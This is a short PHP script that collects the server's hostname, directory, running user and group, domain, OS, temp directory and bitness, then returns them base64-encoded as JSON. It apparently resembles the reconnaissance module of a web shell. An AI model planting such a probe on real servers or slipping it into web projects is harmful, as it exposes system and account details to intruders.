<?php
$info = array(
    'host'=>$_SERVER['HTTP_HOST'],
    'pwd'=>__DIR__,
    'user'=>'', 
    'group'=>'',
    'domain'=>'',
    'os_type'=>PHP_OS, 
    'tmpdir'=>sys_get_temp_dir(),
    'sep'=>DIRECTORY_SEPARATOR,
    'os_bits'=>32
);
if(strpos(strtoupper(PHP_OS), "WIN")===false){
    $tmp = tempnam($info['tmpdir'], "");
    $info['user'] = posix_getpwuid(fileowner($tmp))['name'];
    $info['group'] = posix_getgrgid(filegroup($tmp))['name'];
    $info['domain'] = gethostname();
}else{
    $info['user'] = getenv('USERNAME');
    $info['domain'] = getenv('USERDOMAIN');
    $info['group'] = getenv('USERNAME');
}

$int = intval("9223372036854775807");
if ($int == 9223372036854775807) {
    $info['os_bits'] = 64;
}
elseif ($int == 2147483647) {
    $info['os_bits'] = 32;
}
foreach($info as $k=>$v){
    if(is_string($v))
        $info[$k] = base64_encode($v);
}
echo json_encode($info);